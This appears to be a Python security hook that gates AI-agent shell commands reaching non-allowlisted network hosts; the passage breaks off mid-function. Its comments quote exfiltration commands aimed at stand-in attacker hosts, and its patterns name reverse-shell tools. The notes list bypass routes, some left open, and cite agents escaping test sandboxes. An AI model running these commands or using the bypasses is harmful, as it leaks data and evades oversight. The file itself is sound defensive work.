# /// script
# requires-python = ">=3.10"
# ///
"""
PreToolUse Hook: Block outbound network egress to non-allowlisted destinations.
Deterministic safety — closes the gap where SECURITY.md's Tier-3 "network
requests require human confirmation" claim relied only on the Claude Code
permission-prompt UI, which gives no protection when the daemon runs
unattended (its normal operating mode).

Registration note: `.claude/settings.json` is human-protected, so this module
has no PreToolUse entry of its own. `block_dangerous.py` (already registered
for the Bash matcher) imports `check_command`/`print_block_box` from this
module and runs them after its own dangerous-pattern check — see the end of
`block_dangerous.py`'s `main()`. The module is still fully unit-testable in
isolation (see tests/test_network_egress_guard.py) and its own `main()` below
remains usable standalone (e.g. manual invocation, or a future direct
registration) even though the live wiring goes through block_dangerous.py.
Both call sites record the decision to `logs/gates.jsonl` via `hook_audit`
(this module's own `main()` used to import `record_decision` without ever
calling it, so a direct invocation left no audit trail at all — see
tests/test_network_egress_guard_fires.py).

SCOUT-20260722-2
-----------------
On 2026-07-21 OpenAI disclosed an autonomous agent broke out of a controlled
test environment, reached the open internet, and breached Hugging Face to
obtain answers for the eval it was being scored on. No hook in this repo
inspected a Bash command's network destination: block_dangerous.py's
curl/wget matches only catch piping a download into a shell (RCE), not which
host an outbound request targets. This hook adds that missing check.

Design (same fail-closed philosophy as block_dangerous.py — a regex match
cannot be socially engineered):

1. Detect a short list of unambiguous, high-signal command shapes that
   perform outbound network I/O: curl/wget (with or without a URL scheme —
   both tools default to http:// when none is given), nc/ncat/netcat,
   ssh/scp/sftp, telnet, ftp, rsync-with-remote-spec, git clone/push/pull/
   fetch/remote add|set-url, pip/uv-pip install with an --index-url, docker
   run/pull/push/build/exec, openssl s_client, the `/dev/tcp` bash
   pseudo-device redirect trick, and one-liner interpreter network calls
   (python -c/-m, node -e, perl -e). git/pip are judged by destination via
   the allowlist, NOT exempted from detection — `git clone
   https://attacker.example/x` is a live exfiltration channel exactly like
   `curl`, and treating it as a "trusted" verb would defeat the point.
2. Extract the destination host(s). URL-bearing tokens (curl/wget/git/pip)
   are parsed with `urllib.parse.urlsplit` rather than a naive regex capture
   — that correctly resolves `user@host` userinfo and works with or without
   a scheme, so `curl https://github.com@attacker.example/x` is read as
   reaching `attacker.example`, not `github.com`. A bare `git push`/`fetch`/
   `pull` (the normal form — a remote NAME, not a literal URL) is resolved
   via `git remote get-url <name>` (local metadata only, no network I/O of
   its own) so it's judged by the actually-configured remote instead of
   always being treated as unresolved. git's global options (`-C <path>`,
   `-c <k>=<v>`, `--git-dir=<p>`, `--no-pager`, …) are walked, not assumed
   absent, and the lookup runs in the repository a literal `-C`/`--git-dir`
   names; a path that is not a repository is unresolved. A command that carries a
   connection-override flag (`--resolve`, `--connect-to`, `--proxy`,
   `--socks4a`/`--socks5h`, `ProxyCommand`, an `*_proxy=` env-var prefix, or
   wget's `-e`/`--execute` proxy directive) can redirect the real TCP
   destination away from anything a URL parser can see, so its presence
   forces the destination to UNKNOWN regardless of what was parsed. curl's
   `-x` (lowercase, proxy) is checked case-sensitively and separately from
   `-X` (uppercase, HTTP method) — folding case there would gate every
   ordinary `curl -X POST <allowlisted-url>` forever.
3. Allow only if every extracted host matches the allowlist (Gatesmith's own
   operation needs egress to git/GitHub, PyPI, npm — see DEFAULT_ALLOWLIST).
   If host extraction fails (or a connection-override flag was used), treat
   the destination as unknown — fail closed, do not allow. Plain `docker run
   <image>` (default Docker Hub, no registry host in the command) has no
   extractable host and so always requires the gate, since DEFAULT_ALLOWLIST
   contains no docker registries — consistent with SECURITY.md's Tier 3
   already listing "Running containers" as gated on its own. Note that even
   an explicit allowlisted registry host in the image reference says nothing
   about what a running container does on the network afterward — a
   Bash-command hook fundamentally can't see inside the container.
4. Otherwise: in an INTERACTIVE session, ask the operator to approve this
   one command (a PreToolUse `permissionDecision: "ask"`) — since 2026-08-29,
   at the operator's request, instead of a hard block that forced a detour
   through /gate. Inside an unattended daemon WORKER nobody can answer a
   prompt, so the decision stays a hard block, byte-for-byte as before:
   agent_providers sets FORGE_WORKER_CONTEXT=1 (plus FORGE_DAEMON=1 /
   FORGE_EMPLOYEE_ID for employees) in every worker's environment and the
   marker propagates to hooks. Verified 2026-08-29: in `bypassPermissions`
   mode Claude Code treats a hook's "ask" as ALLOW (the probe command ran
   with no prompt), so the prompt is only offered when the hook's
   `permission_mode` input says a prompt can exist (default / acceptEdits /
   plan); in bypassPermissions, dontAsk, or an unknown mode the decision is
   a hard block whose reason tells the operator how to approve. The
   `.claude/gate_passed` file + 4-hour TTL that permission_auto.py uses
   after a human runs /gate still allows outright, in every context. (A
   /gate approval for an unrelated reason also opens that 4-hour window —
   see `.claude/commands/gate.md`.)
5. All non-allowlisted destinations are gated regardless of HTTP verb.
   Verb-sniffing (block only -X POST/-d) is trivially bypassed by a plain GET
   that exfiltrates via query string (`curl https://evil/x?data=$(cat f)`),
   so it is not a safe basis for the allow/block line.

Reuses block_dangerous.py's obfuscation-resistant canonicalization (so
`curl$IFS https://evil.example` doesn't slip past a raw-substring check) and
permission_auto.py's gate-file check — no logic is duplicated, only imported.

SCOUT-20260729-2
-----------------
Claude Code v2.1.219 added `sandbox.network.strictAllowlist`, a sandbox/proxy-
layer network block that (unlike this file) judges the actual outbound
connection rather than the command text, so it isn't fooled by a destination
built from an unresolved shell variable. Assessed 2026-08-01 as NOT yet
compatible with how Gatesmith's daemon spawns workers today (`--dangerously-skip-
permissions`, no `sandbox.enabled`, no `--settings` flag) — see
`docs/native-sandbox-network-allowlist-assessment.md` for the full trace and
the concrete steps needed before it can be wired in as a verified second
layer. This hook remains the only enforced network-egress control until that
lands.

SCOUT-20260818-1
-----------------
On 2026-08-12 Dream (an Israeli AI/cyberdefense firm) published forensics on
a near-autonomous, four-day AI-agent attack against Taiwan's government
network and nuclear safety agency that harvested "six internal database
credentials spanning MSSQL, Oracle, and Sybase systems" by chaining
reconnaissance across systems discovered mid-attack — this hook's original
NETWORK_EGRESS_PATTERNS had zero coverage for database-client CLIs, so a
Bash command connecting to a remote DB host via psql/mysql/mongo/sqlcmd/
sqlplus/redis-cli/isql bypassed the allowlist entirely. Added detection +
extraction for those seven tools, anchored to "tool name + a host-bearing
flag/connection-string" (not bare invocation, unlike ssh/scp) so purely
local usage like `psql -c "select 1" mydb` isn't flagged. Also closed, per
architecture review, three bypasses in the same class already fixed twice
for curl (see TestSecondRoundBypasses): (1) env-var host overrides
(PGHOST/MYSQL_HOST/SQLCMDSERVER) that set the real destination with no
token on the command line at all — added to the connection-override check
so their presence forces UNKNOWN like curl's `*_proxy=`; (2) attached
short-flag values (`-hhost`, `-Sserver`, no space) alongside the
space-separated form; (3) the legacy bare `mongo host:port/db` positional
shorthand (no `-h`/`--host`, no `mongodb://` scheme). NOT covered: psql's
`key=value` conninfo string (e.g. `psql "host=x port=5432"`) when the host
portion sits inside a quoted multi-word argument that _structural_mask
drops before any masked-form pattern sees it — closing that would require
introducing a raw-vs-masked pattern split like block_dangerous.py's
_RAW_ONLY, which is deferred as a separate follow-up rather than folded
into this change's scope. Also NOT covered (flagged in security review as
the natural next attacker pivot for this exact incident class, but out of
the stated 7-tool scope): dump/restore tools (`mysqldump`, `pg_dump`/
`pg_restore`, `mongodump`/`mongorestore`) — `\bmysql\b` word-boundaries
don't match `mysqldump` (no boundary between `mysql` and `dump`), so
`mysqldump -h attacker.example --all-databases` sails through undetected.
A dedicated follow-up should extend NETWORK_EGRESS_PATTERNS/_db_client_hosts
to this tool family.
"""

import fnmatch
import functools
import json
import os
import re
import shlex
import subprocess
import sys
from collections import Counter
from collections.abc import Mapping
from urllib.parse import urlsplit

try:
    from hook_config import (
        get_exit_code,
        get_max_command_length,
        is_enabled,
        load_config,
    )
except ImportError:  # pragma: no cover - fallback if hook_config unavailable

    def get_exit_code(hook_name: str, issue_found: bool = True) -> int:
        return 2 if issue_found else 0

    def is_enabled(hook_name: str) -> bool:
        return True

    def load_config() -> dict:
        return {}

    def get_max_command_length() -> int:
        return 32 * 1024


try:
    from block_dangerous import (
        _AnalysisDeadline,
        _AnalysisTooComplex,
        _canonical_forms,
        _resolve_vars,
        _structural_mask,
    )
except ImportError:  # pragma: no cover - fallback if block_dangerous unavailable
    print(
        "network_egress_guard: WARNING - block_dangerous unavailable; "
        "obfuscation-resistant command canonicalization is disabled",
        file=sys.stderr,
    )

    class _AnalysisTooComplex(Exception):
        pass

    class _AnalysisDeadline(BaseException):
        pass

    def _canonical_forms(command: str) -> list[str]:
        return [command]

    def _structural_mask(form: str) -> str:
        return form

    def _resolve_vars(s: str) -> str:
        return s


try:
    from permission_auto import is_gate_passed
except ImportError:  # pragma: no cover - fallback if permission_auto unavailable

    def is_gate_passed() -> bool:
        return False


# Auditing must never be able to block a tool call: if this import fails the
# hook still works, it just leaves no record.
try:
    from hook_audit import record_decision
except ImportError:

    def record_decision(*_args, **_kwargs):
        return False


HOOK_NAME = "network_egress_guard"

# Decision policy (2026-08-29): interactive session -> approval prompt;
# unattended daemon worker -> hard block. See docstring point 4.
_UNATTENDED_ENV_MARKERS = ("FORGE_WORKER_CONTEXT", "FORGE_DAEMON", "FORGE_EMPLOYEE_ID")


def is_unattended_context(environ: Mapping[str, str] | None = None) -> bool:
    """True inside a daemon worker, where no human can answer a prompt."""
    env = os.environ if environ is None else environ
    return any(env.get(marker) for marker in _UNATTENDED_ENV_MARKERS)


# Permission modes in which Claude Code can show a prompt for a hook's "ask".
# bypassPermissions treats "ask" as allow (verified 2026-08-29), dontAsk by
# definition cannot prompt, and an unknown/missing mode is not trusted.
_PROMPTABLE_MODES = frozenset({"default", "acceptEdits", "plan"})


def prompts_possible(permission_mode: str | None) -> bool:
    """True when a `permissionDecision: "ask"` would reach a human."""
    return permission_mode in _PROMPTABLE_MODES


def is_ask_decision(result_dict: dict) -> bool:
    """True when the decision dict asks the operator instead of blocking."""
    return result_dict.get("hookSpecificOutput", {}).get("permissionDecision") == "ask"


# =============================================================================
# git's GLOBAL options sit BETWEEN `git` and the subcommand: `git -C <path>
# push …`, `git -c <k>=<v> clone …`, `git --git-dir=<p> fetch …`, `git
# --no-pager …`. Every git-shaped check in this file assumed adjacency
# (`\bgit\s+push`), so a global option hid the subcommand: `git -C /tmp/repo
# clone https://evil.example/x` was not egress at all, and the daemon's own
# `d=$(git rev-parse --show-toplevel); git -C "$d" push -u origin feat/x`
# could not have its remote resolved and was hard blocked (2026-09-05).
# Shared by detection (the regex below over the masked forms, a token walk over
# the raw forms in is_network_egress) and by remote-NAME resolution.
# =============================================================================
# Global options that consume the NEXT token (`-C <path>`, `-c <k>=<v>`,
# `--git-dir <p>`). `-C`/`-c` also take an ATTACHED argument (`-C/p`, `-ck=v`)
# and the long ones an `=` form; those consume nothing further. `--exec-path`
# is deliberately absent: git only accepts its `=` form, and a bare
# `--exec-path` prints and exits — treating it as consuming the next token
# would hide a subcommand from the walker.
_GIT_OPTS_WITH_ARG = frozenset(
    {
        "-C",
        "-c",
        "--git-dir",
        "--work-tree",
        "--namespace",
        "--super-prefix",
        "--config-env",
        "--attr-source",
    }
)
_GIT_OPTS_ATTACHED = ("-C", "-c")
# The options that select WHICH repository the command runs in.
_GIT_REPO_SELECTORS = frozenset({"-C", "--git-dir", "--work-tree"})
# The same option set as a regex fragment, for the masked-form pattern.
_GIT_GLOBAL_OPT_FRAGMENT = (
    r"(?:-[Cc]\s*\S+"
    r"|--(?:git-dir|work-tree|namespace|super-prefix|config-env|attr-source)"
    r"(?:=\S*|\s+\S+)"
    r"|--exec-path(?:=\S*)?"
    r"|--(?:no-pager|paginate|bare|no-replace-objects|no-lazy-fetch"
    r"|no-optional-locks|no-advice|literal-pathspecs|glob-pathspecs"
    r"|noglob-pathspecs|icase-pathspecs)"
    r"|-[pP])"
)
# The detection set is unchanged from the hook's first version: clone/push/
# pull/fetch and `remote add|set-url`. (ls-remote/submodule/archive are
# trusted for scheme-less host extraction below but were never triggers.)
_GIT_EGRESS_SUBCOMMANDS = frozenset({"clone", "push", "pull", "fetch"})
_GIT_EGRESS_REMOTE_VERBS = frozenset({"add", "set-url"})
_GIT_EGRESS_PATTERN = (
    r"\bgit\s+(?:"
    + _GIT_GLOBAL_OPT_FRAGMENT
    + r"\s+)*(clone|push|pull|fetch|remote\s+(add|set-url))\b"
)

# =============================================================================
# High-signal network-egress command shapes. git/pip/docker/openssl ARE
# in scope (judged by destination via the allowlist, not exempted from
# detection) — see module docstring point 1.
# =============================================================================
NETWORK_EGRESS_PATTERNS = [
    r"\b(curl|wget)\b",  # no scheme required — both default to http://
    r"\b(nc|ncat|netcat)\b\s+(-[A-Za-z0-9]+\s+)*[A-Za-z0-9_.-]+\s+\d+",
    r"\b(ssh|scp|sftp)\b\s+",
    r"\btelnet\b\s+[A-Za-z0-9_.-]+",
    r"\bftp\b\s+[A-Za-z0-9_.-]+",
    r"\brsync\b[^\n]*(::|@[A-Za-z0-9_.-]+:)",
    _GIT_EGRESS_PATTERN,
    r"\b(pip3?|uv\s+pip)\s+install\b[^\n]*(--index-url|--extra-index-url|-i\s+https?://)",
    r"\bdocker\s+(run|pull|push|build|exec)\b",
    r"\bopenssl\s+s_client\b",
    r"/dev/(tcp|udp)/[A-Za-z0-9_.-]+/\d+",
    r"\bpython3?\b\s+-[cm]\s+.*"
    r"(requests\.(get|post|put|patch|delete)|urllib\.request|"
    r"socket\.(connect|create_connection)|http\.client)",
    r"\bnode\b\s+-e\s+.*(fetch\(|require\(['\"]https?['\"]\)|require\(['\"]net['\"]\))",
    r"\bperl\b\s+-e\s+.*(LWP::|IO::Socket)",
    # Database client CLIs (SCOUT-20260818-1) — anchored to "tool name +
    # host-bearing flag/connection-string", not bare invocation, so purely
    # local usage (`psql -c "select 1" mydb`, no host) doesn't get flagged.
    # The gap between tool name and flag is bounded to `[^;&|\n]*?` (a single
    # command segment) — an earlier unbounded `[^\n]*` let a DB tool name
    # anywhere on the line pair with an unrelated later command's `-h`/`-S`
    # flag (e.g. `mysql -u root -p localdb; ls -h /tmp` misread as an
    # unresolved DB connection). `-h`/`-S` presence itself is checked
    # case-sensitively via _has_db_client_case_sensitive_flag below — NOT
    # here — since psql's `-H` (HTML output) and sqlcmd/isql's `-s` (column
    # separator / DSN, not server) are real, distinct, unrelated flags that
    # an IGNORECASE match on this list would misread as a host flag.
    r"\b(psql|mysql|mariadb|mongo(?:sh)?|redis-cli)\b[^;&|\n]*?--host\b",
    r"\b(psql|mongo(?:sh)?|redis-cli)\b[^;&|\n]*?"
    r"\b(postgres(?:ql)?|mongodb(?:\+srv)?|rediss?)://",
    r"\bsqlplus\b[^;&|\n]*?@/{0,2}[A-Za-z0-9_.-]+",
    r"\bmongo(?:sh)?\b\s+[A-Za-z0-9_.-]+:\d+(?:/\S*)?",  # legacy bare host:port/db
    r"\b(?:PGHOST|MYSQL_HOST|SQLCMDSERVER)\s*=\S+[^;&|\n]*?\b(psql|mysql|mariadb|sqlcmd)\b",
]

# `-h`/`-S` are checked separately from NETWORK_EGRESS_PATTERNS (and matched
# case-SENSITIVELY, unlike everything else in this file) because folding case
# there would misread two real, unrelated, differently-cased flags as the
# host flag: psql's `-H` is HTML output format, and sqlcmd/isql's `-s` is a
# column-separator character / DSN name, not `-S` (server). Each check is
# scoped to the command segment immediately after a tool-name match (up to
# the next `;`/`&`/`|`) so a DB tool name earlier on the line can't pair with
# an unrelated later command's differently-cased flag either.
_SEGMENT_BOUNDARY_RE = re.compile(r"[;&|]")
_HOST_FLAG_TOOLS_RE = re.compile(
    r"\b(?:psql|mysql|mariadb|mongo(?:sh)?|redis-cli)\b", re.IGNORECASE
)
_LOWERCASE_H_FLAG_RE = re.compile(r"(?<![\w-])-h(?=[A-Za-z0-9=]|\s)")
_SQLCMD_ISQL_TOOL_RE = re.compile(r"\b(?:sqlcmd|isql)\b", re.IGNORECASE)
_UPPERCASE_S_FLAG_RE = re.compile(r"(?<![\w-])-S(?=[A-Za-z0-9]|\s)")


def _segment_after(form: str, start: int) -> str:
    boundary = _SEGMENT_BOUNDARY_RE.search(form, start)
    return form[start : boundary.start() if boundary else len(form)]


def _has_db_client_case_sensitive_flag(form: str) -> bool:
    for m in _HOST_FLAG_TOOLS_RE.finditer(form):
        if _LOWERCASE_H_FLAG_RE.search(_segment_after(form, m.end())):
            return True
    for m in _SQLCMD_ISQL_TOOL_RE.finditer(form):
        if _UPPERCASE_S_FLAG_RE.search(_segment_after(form, m.end())):
            return True
    return False


# Flags/options that let the real TCP destination diverge from anything a URL
# parser can see (DNS override, explicit proxy, SSH ProxyCommand, env-var/
# wgetrc proxy config). Any of these present forces the destination to
# UNKNOWN regardless of what was parsed — never let a parsed-allowlisted host
# quiet an overridden one.
_CONNECTION_OVERRIDE_CI_RE = re.compile(
    r"--resolve\b|--connect-to\b|--proxy\b|--socks(?:4a?|5h?)\b|ProxyCommand"
    r"|\b(?:https?|ftp|all)_proxy\s*="
    r"|(?:-e|--execute)\s+\S*proxy"
    # DB-client host env-var overrides (SCOUT-20260818-1) — same fail-closed
    # treatment as curl's *_proxy=: these set the real connection target with
    # no token on the command line for a URL/flag parser to see at all.
    r"|\b(?:PGHOST|MYSQL_HOST|SQLCMDSERVER)\s*="
    # git configuration that redirects the real destination — reachable as
    # `git -c <key>=<value>` now that global options are accepted before the
    # subcommand, or from the environment: an HTTP proxy, a URL rewrite
    # (`url.<base>.insteadOf` sends a github.com URL somewhere else), an
    # overridden remote URL, or a replaced transport program. Config keys are
    # case-insensitive, like this whole expression.
    r"|\bhttps?\.(?:\S+\.)?proxy\s*="
    r"|\burl\.\S+\.(?:push)?insteadof\s*="
    r"|\bremote\.\S+\.(?:push)?url\s*="
    r"|\bcore\.(?:sshcommand|gitproxy)\s*="
    r"|\bGIT_(?:SSH_COMMAND|SSH|PROXY_COMMAND|CONFIG_PARAMETERS|CONFIG_KEY_\d+)\s*="
    # Repository and config-file selectors from the environment: `GIT_DIR=<p>
    # git push origin` pushes from <p>, which no `-C` walk can see, and
    # GIT_CONFIG_GLOBAL / GIT_CONFIG_SYSTEM select config files that can carry
    # any of the keys above (2026-09-05 challenger, round 2).
    r"|\bGIT_(?:DIR|WORK_TREE|CONFIG_GLOBAL|CONFIG_SYSTEM|OBJECT_DIRECTORY)\s*=",
    re.IGNORECASE,
)
# curl's `-x` (lowercase) is the proxy shorthand; `-X` (uppercase) is the
# unrelated HTTP-method flag (-X POST/GET/...). Case must NOT be folded here
# — an IGNORECASE match would treat every `curl -X POST <allowlisted-url>`
# as a proxy override and gate it forever. Matches both the space-separated
# (`-x http://host`) and attached (`-xhttp://host`) curl argument forms.
_CONNECTION_OVERRIDE_X_RE = re.compile(r"(?<![\w-])-x(?:\s+\S|\S)")


def _has_connection_override(command: str) -> bool:
    return bool(_CONNECTION_OVERRIDE_CI_RE.search(command)) or bool(
        _CONNECTION_OVERRIDE_X_RE.search(command)
    )


# nc/ncat/netcat/telnet/ftp/ssh/scp/sftp/rsync — not URL syntax, so these stay
# regex-based rather than routed through urlsplit.
HOST_EXTRACTION_PATTERNS = [
    r"\b(?:nc|ncat|netcat|telnet|ftp)\s+(?:-[A-Za-z0-9]+\s+)*([A-Za-z0-9_.-]+)",
    r"\b(?:ssh|scp|sftp)\s+(?:-[A-Za-z0-9]+\s+\S+\s+)*(?:[\w.-]+@)?([A-Za-z0-9_.-]+)(?::|\s|$)",
    r"\brsync\b[^\n]*?(?:[\w.-]+@)?([A-Za-z0-9_.-]+)(?:::|:)",
    r"/dev/(?:tcp|udp)/([A-Za-z0-9_.-]+)/\d+",
    r"\bopenssl\s+s_client\b[^\n]*-connect\s+([A-Za-z0-9_.-]+)",
]

_SSH_FAMILY_WORD_RE = re.compile(r"\b(?:ssh|scp|sftp)\b", re.IGNORECASE)


# =============================================================================
# ssh/scp/sftp hosts — EXTRA hosts, read per invocation (2026-10-17)
# -----------------------------------------------------------------------------
# origin/main's ssh pattern (still in HOST_EXTRACTION_PATTERNS, unchanged) needs
# its host followed by `:`, whitespace or end of input, and an occurrence it
# could not read contributed nothing. So `ssh evil.example; curl
# https://github.com` extracted only github.com and was ALLOWED, as were `ssh
# $H; curl …` and `s\sh evil.example`. The readings below add hosts on top: a
# looser regex (a host may also end at an unquoted `;` `&` `|` `(` `)` `<` `>`,
# but NOT at `$`, a quote or a backtick, where the shell appends more text to
# the name) and the token walker. They are EXTRA hosts (see _classified_hosts):
# they can block a command, never resolve one.
#
# Bounded: at most 16 `-opt value` pairs are skipped (more reads the next flag
# as the "host" — junk that no allowlist approves), so each occurrence scans a
# bounded window and a 32 KB `ssh -o ssh -o …` input stays linear.
# =============================================================================
_SSH_OCCURRENCE_RE = re.compile(r"\b(?:ssh|scp|sftp)\s", re.IGNORECASE)
_SSH_HOST_AT_RE = re.compile(
    r"(?:ssh|scp|sftp)\s+(?:-[A-Za-z0-9]+\s+\S+\s+){0,16}(?:[\w.-]+@)?"
    r"([A-Za-z0-9_.-]+)(?=[:\s;&|()<>]|$)",
    re.IGNORECASE,
)
_SSH_FAMILY_VERBS = frozenset({"ssh", "scp", "sftp"})
# Command heads is_network_egress's invocation walk treats as egress.
_EGRESS_HEAD_VERBS = frozenset({"curl", "wget"}) | _SSH_FAMILY_VERBS


_QUOTING_CHARS = str.maketrans("", "", "'\"\\\n\r")


def _may_invoke_ssh_family(command: str) -> bool:
    """Cheap, sound pre-check for the walkers below. A walker's head token is
    shlex's de-quoting of some canonical form's text (or of a substring of it),
    so it can only be ssh/scp/sftp if that form, with quote characters and
    backslashes deleted, spells the word on word boundaries. When no form does,
    the walkers cannot find an ssh-family head and need not run (shlex over a
    large input is what costs)."""
    return any(
        _SSH_FAMILY_WORD_RE.search(form.translate(_QUOTING_CHARS))
        for form in _canonical_forms(command)
    )


def _ssh_family_invoked(command: str) -> bool:
    """Whether ssh/scp/sftp is a command HEAD anywhere in the command — the
    curl/wget invocation walker (wrappers, `sh -c`, eval, find -exec,
    substitutions; shlex de-quoting, so `s\\sh` and `s''sh` read as ssh) run
    with the ssh-family verbs, over the same forms is_network_egress scans."""
    if not _may_invoke_ssh_family(command):
        return False
    raw_forms = _canonical_forms(command)
    for form in raw_forms:
        masked = _structural_mask(form)
        if masked and _fetch_verb_invoked(masked, verbs=_SSH_FAMILY_VERBS):
            return True
        _, bodies = _split_substitutions(form)
        for body in bodies:
            if _fetch_verb_invoked(body, verbs=_SSH_FAMILY_VERBS):
                return True
    return False


# Options of ssh/scp/sftp that take a value (union of the three tools). A
# value-taking letter ends a short-option cluster: the rest of the token, or
# the next token, is its value.
_SSH_OPTS_WITH_VALUE = frozenset("BbcDEeFIiJLlmOoPpQRSsWwX")
# `-o <keyword>[=| ]<value>` — "simple or explicit, else block": only keywords
# known NOT to change where ssh connects, which config it loads, or what it runs
# locally are tolerated; any other keyword makes the destination unresolved.
# A denylist (HostName, ProxyJump) missed `-o=HostName=…` (ssh accepts the
# leading `=`), `-oCanonicalDomains=… -oCanonicalizeHostname=always` and the
# space form `-o "HostName evil"` (2026-10-17 challenger). Deliberately absent:
# HostName, ProxyJump, ProxyCommand, Canonical*, Include, Control* (multiplexes
# over an existing master connection — possibly to another host),
# LocalCommand/PermitLocalCommand and KnownHostsCommand (run local commands),
# and the *Forward keywords.
_SSH_SAFE_OPTION_KEYS = frozenset(
    k.lower()
    for k in (
        "AddKeysToAgent AddressFamily BatchMode CheckHostIP Ciphers Compression "
        "ConnectionAttempts ConnectTimeout EscapeChar FingerprintHash "
        "GlobalKnownHostsFile HashKnownHosts HostKeyAlgorithms IdentitiesOnly "
        "IdentityFile IPQoS KbdInteractiveAuthentication KexAlgorithms LogLevel "
        "MACs NumberOfPasswordPrompts PasswordAuthentication "
        "PreferredAuthentications Port PubkeyAuthentication RequestTTY "
        "ServerAliveCountMax ServerAliveInterval StrictHostKeyChecking "
        "TCPKeepAlive UpdateHostKeys User UserKnownHostsFile VisualHostKey"
    ).split()
)
_SSH_OPTION_KEY_SPLIT_RE = re.compile(r"[=\s]")
_PLAIN_HOST_RE = re.compile(r"^[A-Za-z0-9_.-]+$")


def _ssh_option_is_safe(value: str) -> bool:
    """Whether an `-o` value's keyword is on the safe list. ssh skips leading
    whitespace and `=` before the keyword and ends it at `=` or whitespace."""
    keyword = _SSH_OPTION_KEY_SPLIT_RE.split(value.lstrip("= \t"), maxsplit=1)[0]
    return keyword.lower() in _SSH_SAFE_OPTION_KEYS


def _ssh_spec_host(spec: str) -> str | None:
    """`[user@]host[:path]`, `ssh://[user@]host[:port]/…` -> host, or None."""
    if "://" in spec:
        return _parse_url_host(spec)
    host = spec.rsplit("@", 1)[-1].split(":", 1)[0].strip(".")
    return host.lower() if host and _PLAIN_HOST_RE.match(host) else None


def _ssh_invocation_hosts(tokens: list[str]) -> set[str] | None:
    """Destination hosts of one ssh/scp/sftp invocation (tokens from the head
    on); None when one is unreadable. ssh/sftp: the first operand. scp: every
    operand with a `host:` part (one without is a local path). `-J` jump hosts
    count; an `-o` keyword outside _SSH_SAFE_OPTION_KEYS, `-F <config>` and
    `-S <ctl_path>` make the destination unresolved."""
    head = _norm_head(tokens[0])
    hosts: set[str] = set()
    operands: list[str] = []
    j = 1
    while j < len(tokens):
        tok = tokens[j]
        j += 1
        if tok == "--":
            operands += tokens[j:]
            break
        if not tok.startswith("-") or tok == "-":
            operands.append(tok)
            continue
        letters = tok[1:]
        for idx, ch in enumerate(letters):
            if ch not in _SSH_OPTS_WITH_VALUE:
                continue
            value = letters[idx + 1 :]
            if not value:
                value = tokens[j] if j < len(tokens) else ""
                j += 1
            if ch == "J":
                for jump in value.split(","):
                    jump_host = _ssh_spec_host(jump)
                    if jump_host is None:
                        return None
                    hosts.add(jump_host)
            elif ch == "o" and not _ssh_option_is_safe(value):
                return None
            elif ch in "FS":
                # -F: a config file can set HostName/ProxyJump for the host on
                # the command line. -S: a control socket multiplexes over an
                # existing master connection, which may be to another host.
                return None
            break
    if head == "scp":
        for op in operands:
            if ":" in op.split("/", 1)[0] or "://" in op:
                host = _ssh_spec_host(op)
                if host is None:
                    return None
                hosts.add(host)
        return hosts
    if not operands:
        return None
    host = _ssh_spec_host(operands[0])
    if host is None:
        return None
    hosts.add(host)
    return hosts


def _ssh_family_hosts(command: str) -> set[str] | None:
    """Hosts of every ssh/scp/sftp use in ``command``, read two independent
    ways and UNIONED (a union can only add hosts, i.e. only block more):

    (1) the regex at every raw `ssh|scp|sftp <space>` occurrence — the
        original over-approximation, which also sees code the walker cannot
        parse (`python3 -c "os.system('ssh …')"`). Where it reads nothing it
        adds nothing, exactly as before: it fires on DATA too (`grep -rn ssh
        docs/`), and scp's first operand is usually a local path.
    (2) the token walker over every canonical form and substitution body — the
        real invocations, de-quoted (`s''sh evil.example`), through wrappers
        and `sh -c`. An invocation whose destination it cannot read (`ssh $H`,
        `ssh "$(pick)"`, `-o HostName=…`) makes the result None: unresolved."""
    hosts: set[str] = set()
    for m in _SSH_OCCURRENCE_RE.finditer(command):
        hm = _SSH_HOST_AT_RE.match(command, m.start())
        host = hm.group(1).strip(".") if hm else ""
        if host:
            hosts.add(host.lower())
    if not _may_invoke_ssh_family(command):
        return hosts
    for form in _canonical_forms(command):
        _, bodies = _split_substitutions(form)
        for text in (form, *bodies):
            for tokens in _command_invocations(text, _SSH_FAMILY_VERBS):
                found = _ssh_invocation_hosts(tokens)
                if found is None:
                    return None
                hosts |= found
    return hosts


# git's scp-like remote syntax: `user@host:path` or bare `host:path` (no
# scheme, colon is a path separator, not a port — port form is host:1234/...
# which this deliberately does NOT match since the num-only case is ambiguous
# with `host:port` used elsewhere; scp/ssh extraction above handles that).
_GIT_SCP_STYLE_RE = re.compile(
    r"(?:^|[\s;&|])(?:[\w.-]+@)?([A-Za-z0-9_.-]+\.[A-Za-z]{2,}):(?!\d+(?:\s|$))"
)

DEFAULT_ALLOWLIST = [
    "github.com",
    "*.github.com",
    "*.githubusercontent.com",
    "api.github.com",
    "pypi.org",
    "files.pythonhosted.org",
    "registry.npmjs.org",
]


class AllowlistConfigError(ValueError):
    """gatesmith.json's `security` / `network_allowlist` is malformed."""


def get_allowlist() -> list[str]:
    """Load the network allowlist, overridable via gatesmith.json
    `security.network_allowlist` (full replace, falls back to defaults when
    the key is absent, null or an empty list).

    Raises AllowlistConfigError on a malformed config — `security` that is not
    an object, an allowlist that is not a list of strings. check_command turns
    ANY exception here into a block: an AttributeError from `security: []` used
    to escape as exit 1, which Claude Code runs the command on."""
    config = load_config()
    if not isinstance(config, dict):
        raise AllowlistConfigError("gatesmith.json is not a JSON object")
    security = config.get("security", {})
    if security is None:
        security = {}
    if not isinstance(security, dict):
        raise AllowlistConfigError("`security` is not an object")
    allow = security.get("network_allowlist")
    if allow is None or allow == []:
        return DEFAULT_ALLOWLIST
    if not isinstance(allow, list) or not all(isinstance(h, str) for h in allow):
        raise AllowlistConfigError("`network_allowlist` is not a list of strings")
    return allow


def _allowlist_source() -> str:
    """Where get_allowlist() read the list from, for the block reason.

    The config is found by walking up from the session's cwd, so a session
    working in a PRODUCT repository reads that repository's gatesmith.json,
    not Gatesmith's. On 2026-10-17 a session in such a repository (whose config has
    no network_allowlist, so the built-in defaults applied) was blocked on
    relay hosts that Gatesmith's own config allowlists — and the reason gave no
    hint which file had been read."""
    try:
        from hook_config import find_forge_config

        path = find_forge_config()
        security = load_config().get("security") or {}
        allow = security.get("network_allowlist")
        if path is not None and isinstance(allow, list) and allow:
            return f"allowlist read from {path}"
        where = f"{path} has no" if path is not None else "no gatesmith.json with a"
        return f"built-in default allowlist ({where} security.network_allowlist)"
    except Exception:  # noqa: BLE001 - presentation only, never decides
        return "allowlist source unknown"


def _host_allowed(host: str, allowlist: list[str]) -> bool:
    host = host.lower().rstrip(".")
    for entry in allowlist:
        entry = entry.lower()
        if entry.startswith("*."):
            if host.endswith(entry[1:]):
